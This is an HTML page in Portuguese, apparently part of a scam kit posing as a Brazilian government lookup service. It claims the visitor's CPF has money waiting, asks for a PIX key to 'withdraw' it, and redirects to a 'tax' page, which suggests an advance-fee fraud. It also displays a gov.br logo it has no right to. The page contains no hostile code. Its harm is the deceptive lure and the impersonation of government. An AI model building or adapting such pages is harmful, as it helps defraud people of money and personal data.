<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="./../assets/styles/global.css" />
    <link rel="stylesheet" href="./../assets/styles/withdraw.css" />
    <link
      rel="shortcut icon"
      href="./../assets/images/app_logo.png"
      type="image/x-icon"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"
      integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/0.9.0/jquery.mask.min.js"
      integrity="sha512-oJCa6FS2+zO3EitUSj+xeiEN9UTr+AjqlBZO58OPadb2RfqwxHpjTU8ckIC8F4nKvom7iru2s8Jwdo+Z8zm0Vg=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script src="./../assets/scripts/input-mask.js"></script>
    <script src="./../assets/scripts/user-data.js"></script>
    <title>CONSULTA BRASIL</title>
  </head>
  <body>
    <div class="container">
      <header>
        <img
          class="logo"
          src="./../assets/images/app_logo.png"
          alt="Consulta Brasil"
        />
      </header>
      <section class="text-center">
        <h4>
          O CPF <span class="text-yellow" id="cpf"></span> PESQUISADO TEM
          VALORES A RECEBER
        </h4>
        <h1 id="amount" class="text-yellow">R$0,00</h1>
        <p>Insira sua Chave PIX para realizar seu saque.</p>
      </section>
      <section>
        <form class="form-pix" id="disable">
          <div class="form-item">
            <label>Chave PIX <span class="required">*</span></label>
            <input
              type="text"
              placeholder="Ex: CPF/CNPJ, E-mail, Telefone..."
              required
            />
          </div>
          <a
            onclick="window.location='./../views/tax.html'+window.location.search;"
          >
            <button class="btn bg-orange">
              <i class="fa-solid fa-money-bill-transfer"></i>
              SACAR AGORA
            </button>
          </a>
        </form>
      </section>
      <footer>
        <img src="./../assets/images/gov_logo.png" alt="https://gov.br/" />
        <div class="links center">
          <p>
            <a
              href="./../views/terms-of-use.html"
              class="btn-link"
              target="_blank"
              >Termos de Uso</a
            >
            <span class="btn-link"> | </span>
            <a
              href="./../views/privacy-policy.html"
              class="btn-link"
              target="_blank"
              >Politica de Privacidade</a
            >
          </p>
        </div>
      </footer>
    </div>
  </body>
</html>
